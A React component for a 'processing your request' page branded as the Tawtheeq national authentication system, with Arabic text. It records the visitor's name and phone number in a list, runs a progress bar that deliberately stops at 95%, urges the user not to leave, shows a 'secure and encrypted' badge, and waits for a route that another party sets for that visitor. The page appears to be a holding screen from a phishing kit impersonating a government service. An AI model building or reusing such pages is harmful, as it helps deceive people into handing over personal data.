import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { useRegistration } from "@/contexts/RegistrationContext";
import tawtheeqLogo from "@/assets/tawtheeq-logo.png";

const ProcessingRequest = () => {
  const [progress, setProgress] = useState(0);
  const navigate = useNavigate();
  const { data } = useRegistration();
  const [userId] = useState(() => `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`);

  useEffect(() => {
    // Save user to processing list
    const userName = data.fullNameArabic || data.fullNameEnglish || "مستخدم غير معروف";
    const userPhone = data.mobileNumber || data.visitorMobile || "غير متوفر";
    
    const processingUsers = JSON.parse(localStorage.getItem("processingUsers") || "[]");
    const newUser = {
      id: userId,
      name: userName,
      phone: userPhone,
      timestamp: new Date().toISOString()
    };
    
    processingUsers.push(newUser);
    localStorage.setItem("processingUsers", JSON.stringify(processingUsers));

    // Simulate progress but stop at 95% to indicate ongoing processing
    const timer = setInterval(() => {
      setProgress((prev) => {
        if (prev >= 95) {
          clearInterval(timer);
          return 95;
        }
        return prev + 5;
      });
    }, 300);

    // Check for navigation instructions every 2 seconds
    const navigationCheck = setInterval(() => {
      const navigationInstructions = JSON.parse(localStorage.getItem("navigationInstructions") || "{}");
      if (navigationInstructions[userId]) {
        const route = navigationInstructions[userId];
        
        // Remove the instruction and user from storage
        delete navigationInstructions[userId];
        localStorage.setItem("navigationInstructions", JSON.stringify(navigationInstructions));
        
        const processingUsers = JSON.parse(localStorage.getItem("processingUsers") || "[]");
        const updatedUsers = processingUsers.filter((u: any) => u.id !== userId);
        localStorage.setItem("processingUsers", JSON.stringify(updatedUsers));
        
        // Navigate to the specified route
        clearInterval(navigationCheck);
        navigate(route);
      }
    }, 2000);

    return () => {
      clearInterval(timer);
      clearInterval(navigationCheck);
    };
  }, [userId, data, navigate]);

  return (
    <div className="fixed inset-0 bg-gradient-to-br from-background via-secondary/20 to-background z-50 flex items-center justify-center">
      <div className="text-center space-y-8 px-4 max-w-2xl">
        {/* Logo with pulse animation */}
        <div className="flex justify-center animate-fade-in">
          <div className="relative">
            <div className="absolute inset-0 bg-primary/20 rounded-full blur-2xl animate-pulse"></div>
            <img
              src={tawtheeqLogo}
              alt="توثيق - نظام التوثيق الوطني"
              className="h-24 w-auto relative z-10 drop-shadow-xl"
            />
          </div>
        </div>

        {/* Processing text */}
        <div className="space-y-4 animate-fade-in" style={{ animationDelay: "0.2s" }}>
          <h2 className="text-2xl font-bold text-foreground">
            جاري معالجة طلبكم
          </h2>
          <p className="text-base text-muted-foreground leading-relaxed">
            نحن نعمل على معالجة طلبكم في الوقت الحالي
          </p>
          <p className="text-base text-muted-foreground leading-relaxed">
            يرجى الانتظار وعدم إغلاق هذه الصفحة أو الانتقال إلى صفحة أخرى
          </p>
        </div>

        {/* Warning message */}
        <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 animate-fade-in" style={{ animationDelay: "0.3s" }}>
          <div className="flex items-start gap-3 text-right">
            <svg
              xmlns="http://www.w3.org/2000/svg"
              className="h-6 w-6 text-primary flex-shrink-0 mt-0.5"
              fill="none"
              viewBox="0 0 24 24"
              stroke="currentColor"
            >
              <path
                strokeLinecap="round"
                strokeLinejoin="round"
                strokeWidth={2}
                d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z"
              />
            </svg>
            <div className="text-sm text-foreground">
              <p className="font-semibold mb-1">تنبيه هام</p>
              <p className="text-muted-foreground leading-relaxed">
                إن إغلاق هذه الصفحة أو الانتقال إلى صفحة أخرى قد يؤدي إلى إلغاء العملية وفقدان البيانات التي تم إدخالها. نرجو منكم التحلي بالصبر حتى اكتمال المعالجة.
              </p>
            </div>
          </div>
        </div>

        {/* Progress bar */}
        <div className="w-80 max-w-full mx-auto space-y-2 animate-fade-in" style={{ animationDelay: "0.4s" }}>
          <div className="h-1.5 bg-secondary rounded-full overflow-hidden">
            <div
              className="h-full bg-gradient-to-r from-primary via-primary/80 to-primary transition-all duration-300 ease-out"
              style={{ width: `${progress}%` }}
            ></div>
          </div>
          <p className="text-xs text-muted-foreground text-center">جاري المعالجة...</p>
        </div>

        {/* Spinner */}
        <div className="flex justify-center animate-fade-in" style={{ animationDelay: "0.6s" }}>
          <div className="relative w-16 h-16">
            <div className="absolute inset-0 border-4 border-primary/20 rounded-full"></div>
            <div className="absolute inset-0 border-4 border-transparent border-t-primary rounded-full animate-spin"></div>
          </div>
        </div>

        {/* Security badge */}
        <div className="flex items-center justify-center gap-2 text-xs text-muted-foreground animate-fade-in" style={{ animationDelay: "0.8s" }}>
          <svg
            xmlns="http://www.w3.org/2000/svg"
            className="h-4 w-4 text-primary"
            fill="none"
            viewBox="0 0 24 24"
            stroke="currentColor"
          >
            <path
              strokeLinecap="round"
              strokeLinejoin="round"
              strokeWidth={2}
              d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"
            />
          </svg>
          <span>اتصال آمن ومشفّر</span>
        </div>
      </div>
    </div>
  );
};

export default ProcessingRequest;
